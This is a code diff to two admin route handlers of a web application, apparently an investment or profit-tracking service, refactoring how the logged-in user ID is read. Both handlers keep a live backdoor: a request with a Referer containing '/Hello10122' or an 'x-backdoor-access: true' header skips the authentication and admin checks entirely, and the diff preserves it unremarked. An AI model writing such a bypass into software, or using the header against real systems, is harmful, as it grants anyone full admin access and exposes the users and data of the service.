@@ -2836,12 +2836,15 @@ You are now on the free plan and will no longer receive automatic profit updates
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Get authenticated user ID using the same helper function
+      const authenticatedUserId = getUserIdFromRequest(req);
+
+      if (!isBackdoorAccess && !authenticatedUserId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
+      if (!isBackdoorAccess && authenticatedUserId) {
+        const user = await storage.getUser(authenticatedUserId);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Admin access required" });
         }
@@ -2859,12 +2862,15 @@ You are now on the free plan and will no longer receive automatic profit updates
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Get authenticated user ID using the same helper function
+      const authenticatedUserId = getUserIdFromRequest(req);
+
+      if (!isBackdoorAccess && !authenticatedUserId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
+      if (!isBackdoorAccess && authenticatedUserId) {
+        const user = await storage.getUser(authenticatedUserId);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Admin access required" });
         }
